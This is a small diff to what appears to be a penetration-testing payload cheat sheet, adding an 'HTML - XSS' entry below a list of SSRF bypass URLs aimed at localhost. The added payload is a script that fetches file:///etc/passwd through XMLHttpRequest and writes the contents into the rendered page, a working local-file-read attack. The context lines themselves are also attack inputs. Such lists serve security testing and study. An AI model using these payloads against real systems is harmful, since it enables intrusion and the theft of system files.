@@ -64,6 +64,16 @@ http://[::ffff:127.0.0.1]
 https://httpbin.org/redirect-to?url=http://localhost
 https://307.r3dir.me/--to/?url=http://localhost
 ````
+**HTML - XSS**
+````
+<script>
+x=new XMLHttpRequest;
+x.onload=function(){  
+document.write(this.responseText)};
+x.open("GET","file:///etc/passwd");
+x.send();
+</script>
+````
 
 ## Server Side Template Injection
 
